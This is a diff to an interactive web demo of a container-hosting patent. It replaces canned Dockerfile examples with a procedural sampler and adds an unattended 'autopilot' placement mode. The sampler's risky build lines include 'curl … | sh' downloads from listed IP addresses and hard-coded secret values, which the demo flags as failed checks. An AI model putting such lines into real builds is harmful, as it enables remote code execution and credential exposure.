@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>US 12,112,155 B2 — Container Border Control</title>
-<meta name="description" content="Interactive walkthrough of US 12,112,155 B2 — Software Application Container Hosting. Containers as passengers, Dockerfiles as passports, clouds as gates.">
+<title>US 12,112,155 B2 — Autonomous Multi-Cloud Container Placement</title>
+<meta name="description" content="Interactive demo of US 12,112,155 B2 — Software Application Container Hosting. Scores container images and places them on the safest cloud automatically, with no human in the loop. Workloads are synthesised procedurally, so every run is different.">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -78,6 +78,21 @@ section.live{border-color:var(--bd2)}
 .btn.primary:hover{background:#ffc46a;color:#161006}
 .btn:disabled{opacity:.35;cursor:default;pointer-events:none}
 .hint{font-size:12px;color:var(--t3)}
+.sampler-note{font-size:12px;color:var(--t3);background:var(--s2);border:1px solid var(--bd);border-left:3px solid var(--cyan);border-radius:8px;padding:9px 12px;margin-bottom:12px;line-height:1.7}
+.sampler-note b{color:var(--t1)}
+.sampler-note #spaceSize{color:var(--cyan);font-family:var(--mono)}
+.seedtag{font-family:var(--mono);font-size:10px;color:var(--t3);float:right;margin-left:8px}
+.seedtag b{color:var(--t2)}
+.flight.fresh{animation:mint .5s ease}
+@keyframes mint{from{opacity:0;transform:translateY(8px) scale(.97)}to{opacity:1;transform:none}}
+.tally{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;font-family:var(--mono);font-size:11px}
+.tally .tc{background:var(--s2);border:1px solid var(--bd);border-radius:7px;padding:6px 10px;color:var(--t2)}
+.tally .tc b{color:var(--t1);font-size:13px}
+.tally .tc.den{border-color:rgba(255,84,112,.35)}
+.tally .tc.den b{color:var(--red)}
+.btn.stopping{background:var(--red);border-color:var(--red);color:#fff}
+.autopulse{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:6px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
 
 /* ============ PASSPORT / DOCKERFILE ============ */
 .passport{display:grid;grid-template-columns:1fr 260px;gap:14px}
@@ -220,9 +235,9 @@ footer a{color:var(--blue);text-decoration:none}
 
 <header>
   <div class="kicker">Interactive patent demo</div>
-  <h1>Container <span class="thin">Border</span> Control</h1>
+  <h1>Autonomous <span class="thin">Multi-Cloud</span> Placement</h1>
   <div class="patent-tag"><a href="https://patents.google.com/patent/US12112155B2/en" target="_blank" rel="noopener">US 12,112,155 B2</a> · Software Application Container Hosting · Kyndryl · Monteiro Vieira et&nbsp;al.</div>
-  <p class="lede">Every container is a <b>passenger</b>. Its Dockerfile is a <b>passport</b>, the patent's monotonicity conditions are <b>customs checks</b>, and each cloud is a <b>departure gate</b> with its own security posture. The engine reads the passport, scores the risk, and decides <b>which cloud — if any — may board it</b>.</p>
+  <p class="lede">The engine deploys containers across <b>several clouds with no human in the loop</b>. It reads the build file, scores the image against the patent's monotonicity conditions, and places the workload on whichever cloud its own controls make safest &mdash; or refuses it outright. Nobody approves anything.<br><br><b>Nothing here is hand-picked.</b> Every admission request below is synthesised on the spot from a combinatorial sampler, so the queue you are looking at has never existed before and will not repeat. Press <b>AUTOPILOT</b> and the engine runs unattended, admitting workload after workload until you stop it.</p>
   <div class="board" id="board"></div>
 </header>
 
@@ -237,14 +252,21 @@ footer a{color:var(--blue);text-decoration:none}
 
 <!-- 1 · PASSENGERS -->
 <section id="sec-pick" class="live">
-  <div class="sec-h"><span class="num">1</span><h2>Choose a passenger</h2><span class="sub">application containers · FIG. 1 (2122)</span></div>
+  <div class="sec-h"><span class="num">1</span><h2>Admission queue</h2><span class="sub">synthesised workloads · FIG. 1 (2122)</span></div>
   <div class="sec-b">
+    <div class="sampler-note" id="samplerNote">
+      <b>Procedural sampler.</b> Each request is composed from a service domain, a language stack, a provenance tier and a runtime posture, drawn independently. The space is <b id="spaceSize">—</b> distinct build files; these three were minted <span id="mintAge">just now</span>.
+      <span class="seedtag">seed <b id="seedVal">—</b></span>
+    </div>
     <div class="flights" id="flights"></div>
     <div class="runbar">
-      <button class="btn primary" id="runBtn" onclick="runPipeline()">▶ RUN BORDER CONTROL</button>
+      <button class="btn primary" id="autoBtn" onclick="autopilot()">▶ AUTOPILOT — RUN UNATTENDED</button>
+      <button class="btn" id="runBtn" onclick="runPipeline()">▷ STEP ONE WORKLOAD</button>
+      <button class="btn" id="regenBtn" onclick="regenQueue(true)">↻ RESAMPLE QUEUE</button>
       <button class="btn" id="cveBtn" onclick="injectCVE()" disabled>⚡ INJECT ZERO-DAY NEWS</button>
-      <span class="hint" id="runHint">Pick a container, then run it through the checks.</span>
+      <span class="hint" id="runHint">Autopilot needs no selection. It takes whatever the sampler emits.</span>
     </div>
+    <div class="tally" id="tally"></div>
   </div>
 </section>
 
@@ -370,59 +392,202 @@ const CHECKS = [
 // synthetic condition injected by the news aggregator (140)
 const CVE_CHECK = {id:'cve', grp:'b', ref:'140', label:'Base image clear of CVE-2026-31337 (zero-day)', pen:-45, e:5,p:5,i:5, cat:0, fix:'rebuild on patched base'};
 
-const FLIGHTS = {
- pay:{
-  no:'PAY-001', name:'Payment API · node 20', tone:'ok',
-  tags:[['pinned digest','ok'],['non-root','ok'],['1 gap','warn']],
-  fails:['health'], cveHit:false,
-  file:'Dockerfile · payment-api',
-  lines:[
-   {t:'FROM registry.local/base/node:20@sha256:ab12f9…', ok:['registry.local','@sha256:ab12f9…']},
-   {t:'USER app', ok:['USER app']},
-   {t:'COPY package.json package-lock.json ./', ok:['COPY']},
-   {t:'COPY src/ ./src', ok:['COPY']},
-   {t:'RUN npm ci --omit=dev'},
-   {t:'EXPOSE 8443'},
-   {t:'ENTRYPOINT ["node","src/server.js"]'},
-  ],
-  missing:[{what:'HEALTHCHECK — not found in file', check:'health'}],
-  manifest:'runtime request → privileged:false · readOnlyRootFs:true · memory:512Mi · hostNetwork:false',
-  terms:[['FROM',1,''],['COPY',2,''],['USER',1,''],['@sha256',1,''],['HEALTHCHECK',0,'warm'],['npm ci',1,'']]
- },
- leg:{
-  no:'LEG-047', name:'Legacy payroll batch', tone:'warn',
-  tags:[['ubuntu:latest','warn'],['runs as root','bad'],['sshd inside','bad']],
-  fails:['user','trusted','copy','health','update','sshd','ro','mem','priv'], cveHit:true,
-  file:'Dockerfile · legacy-payroll',
-  lines:[
-   {t:'FROM ubuntu:latest', bad:[['ubuntu:latest','trusted']]},
-   {t:'RUN apt-get update && apt-get upgrade -y', bad:[['apt-get upgrade -y','update']]},
-   {t:'ADD payroll.tar.gz /opt/legacy/', bad:[['ADD','copy']]},
-   {t:'RUN apt-get install -y openssh-server', bad:[['openssh-server','sshd']]},
-   {t:'EXPOSE 22 8080', warn:[['22','sshd']]},
-   {t:'# TODO: create app user someday', bad:[['# TODO: create app user someday','user']]},
-   {t:'CMD service ssh start && /run.sh'},
-  ],
-  missing:[{what:'HEALTHCHECK — not found in file', check:'health'}],
-  manifest:'runtime request → privileged:TRUE · readOnlyRootFs:false · memory:unlimited · hostNetwork:false',
-  terms:[['latest',1,'warm'],['ADD',1,'warm'],['upgrade',1,'warm'],['ssh',3,'hot'],['USER',0,'hot'],['privileged',1,'hot']]
- },
- shd:{
-  no:'SHD-666', name:'Shadow build · origin unknown', tone:'bad',
-  tags:[['embedded secret','bad'],['curl | sh','bad'],['docker.sock','bad']],
-  fails:['user','trusted','secrets','scan','priv','sock','seccomp','netns','ro'], cveHit:false,
-  file:'Dockerfile · (unverified)',
-  lines:[
-   {t:'FROM ghcr.io/unknown/img:latest', bad:[['unknown','trusted'],['latest','trusted']]},
-   {t:'ENV AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI…', bad:[['AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI…','secrets']]},
-   {t:'RUN curl -sk http://185.66.99.1/x.sh | sh', bad:[['curl -sk http://185.66.99.1/x.sh | sh','scan']]},
-   {t:'USER root', bad:[['USER root','user']]},
-  ],
-  missing:[],
-  manifest:'runtime request → privileged:TRUE · seccomp:unconfined · hostNetwork:TRUE · mount:/var/run/docker.sock · rootFs:rw',
-  terms:[['SECRET_KEY',1,'hot'],['curl|sh',1,'hot'],['root',1,'hot'],['docker.sock',1,'hot'],['unconfined',1,'hot'],['latest',1,'warm']]
+// ═══════════════════════════════════════════════════════════════
+// PROCEDURAL WORKLOAD SAMPLER
+// The patent operates unattended: workloads are not curated, they arrive
+// from the orchestrator (110) as a stream. Rather than ship three canned
+// examples, this demo synthesises every admission request from independent
+// draws — domain × stack × provenance tier × runtime posture — and derives
+// the build file, the failing conditions and the term frequencies from
+// those draws. No two runs see the same passport.
+// ═══════════════════════════════════════════════════════════════
+let SEED = (Date.now() ^ (Math.random()*1e9)) >>> 0;
+function rnd(){ SEED^=SEED<<13; SEED>>>=0; SEED^=SEED>>17; SEED^=SEED<<5; SEED>>>=0; return SEED/4294967296; }
+const one = a => a[Math.floor(rnd()*a.length)];
+const some = (a,n) => { const c=[...a],o=[]; while(o.length<n&&c.length) o.push(c.splice(Math.floor(rnd()*c.length),1)[0]); return o; };
+const odds = p => rnd()<p;
+const intg = (lo,hi) => lo+Math.floor(rnd()*(hi-lo+1));
+
+const DOMAINS=['payment','fraud-score','telemetry','billing','identity','catalogue','notify','ledger','ingest','edge-gw','reconcile','kyc-check','pricing','settlement','audit-trail','clearing'];
+const STACKS=[
+ {k:'node',   base:'node:20',                             dep:'npm ci --omit=dev',                 cp:'package.json package-lock.json ./', entry:'["node","src/server.js"]',   port:8443},
+ {k:'python', base:'python:3.12-slim',                    dep:'pip install --no-cache-dir -r requirements.txt', cp:'requirements.txt ./', entry:'["python","-m","app"]',      port:8000},
+ {k:'go',     base:'golang:1.22',                         dep:'go build -trimpath -o /bin/svc ./cmd', cp:'go.mod go.sum ./',              entry:'["/bin/svc"]',               port:9090},
+ {k:'java',   base:'eclipse-temurin:21-jre',              dep:'./mvnw -q -DskipTests package',     cp:'pom.xml ./',                       entry:'["java","-jar","/app/svc.jar"]', port:8080},
+ {k:'dotnet', base:'mcr.microsoft.com/dotnet/aspnet:8.0', dep:'dotnet restore',                    cp:'*.csproj ./',                      entry:'["dotnet","Svc.dll"]',       port:5000},
+ {k:'rust',   base:'rust:1.79-slim',                      dep:'cargo build --release --locked',    cp:'Cargo.toml Cargo.lock ./',         entry:'["/app/target/release/svc"]',port:7000},
+];
+const REGISTRIES=['registry.internal','harbor.corp.local','artifactory.internal','ecr.private'];
+const WILD=['docker.io/library','ghcr.io/unknown','quay.io/mirror-x','hub.public'];
+const TIERS=[
+ {id:'gold',   p:.30, label:'internal registry · digest pinned'},
+ {id:'silver', p:.34, label:'public registry · floating tag'},
+ {id:'bronze', p:.24, label:'inherited legacy build'},
+ {id:'shadow', p:.12, label:'provenance unverified'},
+];
+const SECRET_KINDS=[
+ ['AWS_SECRET_ACCESS_KEY','wJalrXUtnFEMI/K7MDENG…'],
+ ['DB_PASSWORD','Pr0d!ledger#2026'],
+ ['STRIPE_API_KEY','sk_live_51H7xQ2eZvKY…'],
+ ['PRIVATE_KEY_PEM','-----BEGIN RSA PRIVATE KEY-----MIIE…'],
+ ['SPLUNK_HEC_TOKEN','8f3b91c2-4d17-4a0e-9c22…'],
+];
+const DROP_IPS=['185.66.99.1','45.83.212.9','91.240.118.7','193.201.9.66'];
+
+function drawTier(){ let r=rnd(),a=0; for(const t of TIERS){ a+=t.p; if(r<a) return t; } return TIERS[TIERS.length-1]; }
+
+// The full sample space, stated honestly for the note in the UI.
+const SPACE_SIZE = (DOMAINS.length * STACKS.length * TIERS.length * 4 * 2**7).toLocaleString('en-GB');
+
+let FLIGHTS = {};
+let mintedAt = Date.now();
+
+function synth(key){
+ const dom=one(DOMAINS), st=one(STACKS), tier=drawTier();
+ const svc=`${dom}-${st.k}`;
+ const no=`${dom.slice(0,3).toUpperCase()}-${String(intg(100,999))}`;
+ const fails=[], lines=[], terms=[], tags=[], missing=[];
+ let cveHit=false;
+
+ // ── base image provenance ──────────────────────────────────
+ if(tier.id==='gold'){
+   const reg=one(REGISTRIES), dig=Math.random().toString(16).slice(2,8);
+   lines.push({t:`FROM ${reg}/base/${st.base}@sha256:${dig}…`, ok:[reg,`@sha256:${dig}…`]});
+   tags.push(['pinned digest','ok']);
+   terms.push(['@sha256',1,'']);
+ } else if(tier.id==='silver'){
+   lines.push({t:`FROM ${st.base.split(':')[0]}:latest`, bad:[['latest','trusted']]});
+   fails.push('trusted'); cveHit=true;
+   tags.push([':latest tag','warn']);
+   terms.push(['latest',1,'warm']);
+ } else if(tier.id==='bronze'){
+   lines.push({t:`FROM ubuntu:latest`, bad:[['ubuntu:latest','trusted']]});
+   fails.push('trusted'); cveHit=true;
+   tags.push(['legacy base','warn']);
+   terms.push(['latest',1,'warm']);
+ } else {
+   lines.push({t:`FROM ${one(WILD)}/img:latest`, bad:[['latest','trusted']]});
+   fails.push('trusted');
+   tags.push(['origin unknown','bad']);
+   terms.push(['unverified',1,'hot']);
  }
-};
+
+ // ── embedded secret ────────────────────────────────────────
+ if(odds(tier.id==='shadow'?.85:tier.id==='bronze'?.30:.06)){
+   const [k,v]=one(SECRET_KINDS);
+   lines.push({t:`ENV ${k}=${v}`, bad:[[`${k}=${v}`,'secrets']]});
+   fails.push('secrets'); tags.push(['embedded secret','bad']);
+   terms.push([k.split('_')[0],1,'hot']);
+ }
+
+ // ── curl-pipe-shell ────────────────────────────────────────
+ if(odds(tier.id==='shadow'?.7:.08)){
+   const ip=one(DROP_IPS);
+   lines.push({t:`RUN curl -sk http://${ip}/install.sh | sh`, bad:[[`curl -sk http://${ip}/install.sh | sh`,'scan']]});
+   fails.push('scan'); tags.push(['curl | sh','bad']);
+   terms.push(['curl|sh',1,'hot']);
+ }
+
+ // ── package update hygiene ─────────────────────────────────
+ if(odds(tier.id==='gold'?.05:.45)){
+   lines.push({t:'RUN apt-get update && apt-get upgrade -y', bad:[['apt-get upgrade -y','update']]});
+   fails.push('update'); terms.push(['upgrade',1,'warm']);
+ }
+
+ // ── ADD vs COPY ────────────────────────────────────────────
+ if(odds(tier.id==='gold'?.04:.38)){
+   lines.push({t:`ADD ${svc}.tar.gz /opt/${dom}/`, bad:[['ADD','copy']]});
+   fails.push('copy'); terms.push(['ADD',1,'warm']);
+ } else {
+   lines.push({t:`COPY ${st.cp}`, ok:['COPY']});
+   terms.push(['COPY',intg(1,3),'']);
+ }
+ lines.push({t:`RUN ${st.dep}`});
+
+ // ── sshd inside the container ──────────────────────────────
+ if(odds(tier.id==='bronze'?.6:tier.id==='shadow'?.35:.05)){
+   lines.push({t:'RUN apt-get install -y openssh-server', bad:[['openssh-server','sshd']]});
+   lines.push({t:`EXPOSE 22 ${st.port}`, warn:[['22','sshd']]});
+   fails.push('sshd'); tags.push(['sshd inside','bad']);
+   terms.push(['ssh',intg(2,3),'hot']);
+ } else {
+   lines.push({t:`EXPOSE ${st.port}`});
+ }
+
+ // ── non-root user ──────────────────────────────────────────
+ if(odds(tier.id==='gold'?.03:tier.id==='silver'?.30:.75)){
+   if(odds(.5)) lines.push({t:'USER root', bad:[['USER root','user']]});
+   else lines.push({t:`# TODO: drop privileges before GA`, bad:[['# TODO: drop privileges before GA','user']]});
+   fails.push('user'); tags.push(['runs as root','bad']);
+   terms.push(['root',1,'hot']);
+ } else {
+   lines.push({t:`USER ${dom.split('-')[0]}`, ok:[`USER ${dom.split('-')[0]}`]});
+   terms.push(['USER',1,'']);
+ }
+
+ // ── healthcheck ────────────────────────────────────────────
+ if(odds(.55)){
+   fails.push('health');
+   missing.push({what:'HEALTHCHECK — not found in file', check:'health'});
+   terms.push(['HEALTHCHECK',0,'warm']);
+ } else {
+   lines.push({t:`HEALTHCHECK CMD curl -f http://localhost:${st.port}/healthz || exit 1`, ok:['HEALTHCHECK']});
+ }
+
+ // ── image scanning ─────────────────────────────────────────
+ if(odds(tier.id==='gold'?.05:.42)) fails.push('scan');
+
+ lines.push({t:`ENTRYPOINT ${st.entry}`});
+
+ // ── runtime posture (manifest) ─────────────────────────────
+ const priv = odds(tier.id==='shadow'?.8:tier.id==='bronze'?.4:.08);
+ const sock = odds(tier.id==='shadow'?.65:.05);
+ const secc = odds(tier.id==='shadow'?.6:.10);
+ const netn = odds(tier.id==='shadow'?.55:.09);
+ const ro   = !odds(tier.id==='gold'?.85:.35);
+ const mem  = !odds(tier.id==='gold'?.9:.5);
+ if(priv){ fails.push('priv'); tags.push(['privileged','bad']); terms.push(['privileged',1,'hot']); }
+ if(sock){ fails.push('sock'); tags.push(['docker.sock','bad']); terms.push(['docker.sock',1,'hot']); }
+ if(secc){ fails.push('seccomp'); terms.push(['unconfined',1,'hot']); }
+ if(netn){ fails.push('netns'); }
+ if(ro)   fails.push('ro');
+ if(mem)  fails.push('mem');
+
+ const manifest = `runtime request → privileged:${priv?'TRUE':'false'} · seccomp:${secc?'unconfined':'default'} · readOnlyRootFs:${ro?'false':'true'} · memory:${mem?'unlimited':intg(2,16)*128+'Mi'} · hostNetwork:${netn?'TRUE':'false'}${sock?' · mount:/var/run/docker.sock':''}`;
+
+ // ── tone + summary tag ─────────────────────────────────────
+ const weight = fails.reduce((a,id)=>{ const c=CHECKS.find(x=>x.id===id); return a+(c?c.e+c.p+c.i:0); },0);
+ const tone = weight>=30?'bad':weight>=12?'warn':'ok';
+ if(!tags.length) tags.push(['clean build','ok']);
+ tags.push([`${fails.length} gap${fails.length===1?'':'s'}`, tone==='ok'?'ok':tone==='warn'?'warn':'bad']);
+
+ return {no, name:`${svc} · ${tier.label}`, tone, tags:tags.slice(0,3), fails:[...new Set(fails)],
+         cveHit, file:`Dockerfile · ${svc}`, lines, missing, manifest,
+         terms:terms.slice(0,6), tier:tier.id};
+}
+
+function regenQueue(announce){
+ if(running) return;
+ FLIGHTS = { s1:synth('s1'), s2:synth('s2'), s3:synth('s3') };
+ mintedAt = Date.now();
+ fixed = new Set(); lastRun = null;
+ buildFlights();
+ document.querySelectorAll('.flight').forEach(e=>e.classList.add('fresh'));
+ if($('seedVal')) $('seedVal').textContent = '0x'+SEED.toString(16).padStart(8,'0');
+ if($('spaceSize')) $('spaceSize').textContent = SPACE_SIZE;
+ if($('mintAge')) $('mintAge').textContent = 'just now';
+ pick('s1');
+ if(announce){ log('SAMPLE','orchestrator 110 emitted three fresh admission requests','info'); }
+}
+
+// placement tally — proof the engine is deciding on its own
+const TALLY = {A:0,B:0,C:0,DENIED:0};
+function renderTally(){
+ const t=$('tally'); if(!t) return;
+ t.innerHTML = GATES.map(g=>`<div class="tc">GATE ${g.id} <b>${TALLY[g.id]}</b></div>`).join('')
+  + `<div class="tc den">REFUSED <b>${TALLY.DENIED}</b></div>`
+  + `<div class="tc">unattended decisions <b>${TALLY.A+TALLY.B+TALLY.C+TALLY.DENIED}</b></div>`;
+}
 
 // Gates: each candidate cloud supplies its own script data (FIG. 2, 1201–1204)
 // and enforces different mitigations — so scores differ per gate.
@@ -492,11 +657,11 @@ function buildGates(){
     </div>`).join('');
 }
 function pick(k){
-  if(running) return;
+  if(running || !FLIGHTS[k]) return;
   sel=k; fixed=new Set();
   document.querySelectorAll('.flight').forEach(e=>e.classList.remove('sel'));
-  $('fl-'+k).classList.add('sel');
-  $('runHint').textContent=`${FLIGHTS[k].no} at the checkpoint. Run border control.`;
+  const el=$('fl-'+k); if(el) el.classList.add('sel');
+  if(!auto) $('runHint').textContent=`${FLIGHTS[k].no} queued. Step it, or hand the queue to autopilot.`;
 }
 
 // ═══════════════ LOG / TOAST / RL ═══════════════
@@ -543,7 +708,7 @@ function renderLine(l){
 async function runPipeline(){
   if(running) return;
   if(!sel){ toast('Pick a passenger first'); return; }
-  running=true; $('runBtn').disabled=true; $('cveBtn').disabled=true;
+  running=true; $('runBtn').disabled=true; $('cveBtn').disabled=true; $('regenBtn').disabled=true;
   const f=FLIGHTS[sel];
   lastRun=sel;
 
@@ -649,10 +814,12 @@ async function runPipeline(){
     dl.innerHTML=`⛔ <b>No gate will board ${f.no}.</b> Best offer was ${best.score.toFixed(2)} at gate ${best.g.id} — still HIGH risk. The orchestrator refuses hosting entirely; the container is quarantined.`;
     log('DECIDE',`all gates refused ${f.no} — admission denied`,'err');
     $('fs-'+sel).textContent='DENIED'; $('fs-'+sel).style.cssText='display:block;background:rgba(255,84,112,.15);color:#ff5470';
+    TALLY.DENIED++; renderTally();
   } else {
     for(const r of results){ const el=$('gate-'+r.g.id); el.classList.add(r===best?'win':'lose'); if(r===best) $('gtag-'+r.g.id).textContent='SELECTED'; }
-    dl.innerHTML=`🛫 <b>${f.no} boards at GATE ${best.g.id}</b> — score ${best.score.toFixed(2)} vs ${results.slice(1).map(r=>`${r.score.toFixed(2)} (${r.g.id})`).join(' / ')}. “Selecting a hosting computing environment… in dependence on the text-based processing” — claim 1, satisfied.`;
+    dl.innerHTML=`🛫 <b>${f.no} boards at GATE ${best.g.id}</b> — score ${best.score.toFixed(2)} vs ${results.slice(1).map(r=>`${r.score.toFixed(2)} (${r.g.id})`).join(' / ')}. “Selecting a hosting computing environment… in dependence on the text-based processing” — claim 1, satisfied. No operator was consulted.`;
     log('DECIDE',`hosting request sent (1113) → gate ${best.g.id} instantiates ${f.no} (1205)`,'ok');
+    TALLY[best.g.id]++; renderTally();
     $('fs-'+sel).textContent='GATE '+best.g.id; $('fs-'+sel).style.cssText='display:block;background:rgba(61,220,132,.15);color:#3ddc84';
   }
   dl.style.display='block';
@@ -661,7 +828,7 @@ async function runPipeline(){
   rlUpdate(f,score);
   setStep(3,true); liveSec('sec-learn');
   log('ML',`episode logged — models 9002/9004 retrained on failure events`,'info');
-  running=false; $('runBtn').disabled=false; $('cveBtn').disabled=false;
+  running=false; if(!auto){ $('runBtn').disabled=false; $('regenBtn').disabled=false; } $('cveBtn').disabled=false;
   $('runHint').textContent='Try FIX on failed checks, inject a zero-day, or run another passenger.';
 }
 
@@ -744,9 +911,43 @@ async function injectCVE(){
   }
 }
 
+// ═══════════════ AUTOPILOT — the point of the patent ═══════════════
+// No selection, no approval, no click between workloads. The engine keeps
+// admitting, scoring and placing containers until a human interrupts it.
+let auto=false, autoCount=0;
+async function autopilot(){
+  if(auto){ stopAuto('operator interrupted the run'); return; }
+  auto=true; autoCount=0;
+  const b=$('autoBtn'); b.textContent='■ STOP AUTOPILOT'; b.classList.add('stopping'); b.classList.remove('primary');
+  $('runBtn').disabled=true; $('regenBtn').disabled=true;
+  $('runHint').innerHTML='<span class="autopulse"></span>running unattended — no human decisions from here';
+  log('AUTO','autopilot engaged — orchestrator 110 now placing workloads without approval','ok');
+  while(auto){
+    regenQueue(false);
+    const keys=Object.keys(FLIGHTS);
+    sel = keys[Math.floor(rnd()*keys.length)];   // engine takes what arrives
+    $('fl-'+sel) && $('fl-'+sel).classList.add('sel');
+    await runPipeline();
+    if(!auto) break;
+    autoCount++;
+    if(autoCount===3 && !cveOn){ await injectCVE(); }   // advisory lands mid-flight
+    await sleep(1100);
+  }
+}
+function stopAuto(why){
+  auto=false;
+  const b=$('autoBtn'); b.textContent='▶ AUTOPILOT — RUN UNATTENDED'; b.classList.remove('stopping'); b.classList.add('primary');
+  $('runBtn').disabled=false; $('regenBtn').disabled=false;
+  $('runHint').textContent='Autopilot stopped after '+autoCount+' unattended placements. '+(why||'');
+  log('AUTO','autopilot disengaged after '+autoCount+' placements','warn');
+}
+
 // init
-buildBoard(); buildFlights(); buildChecks(); buildGates();
-pick('leg');
+buildBoard(); buildChecks(); buildGates(); regenQueue(false); renderTally();
+setInterval(()=>{ const el=$('mintAge'); if(!el||auto) return;
+  const s=Math.floor((Date.now()-mintedAt)/1000);
+  el.textContent = s<3?'just now':s<60?s+' s ago':Math.floor(s/60)+' min ago';
+},1000);
 </script>
 
 <!-- ===== RETRO NAV (site-wide) ===== -->
